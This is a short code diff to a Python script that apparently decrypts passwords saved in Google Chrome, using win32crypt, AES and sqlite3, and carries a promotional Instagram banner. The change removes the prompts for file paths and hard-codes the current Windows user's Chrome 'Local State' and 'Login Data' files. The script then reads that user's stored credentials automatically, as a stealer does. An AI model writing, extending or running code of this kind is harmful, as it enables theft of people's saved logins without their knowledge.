@@ -5,6 +5,7 @@ import sqlite3
 import win32crypt
 from Crypto.Cipher import AES
 import shutil
+import getpass
 
 os.system("cls")
 
@@ -85,8 +86,8 @@ print(color.RED+"Instagram : www.instagram.com/mdtrackers")
 
 print(color.WHITE)
 
-lcc = input("Local State > ")
-lgg = input("Login Data > ")
+lcc = "C:\\Users\\"+getpass.getuser()+"\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
+lgg = "C:\\Users\\"+getpass.getuser()+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
 
 FileName = 116444736000000000
 NanoSeconds = 10000000
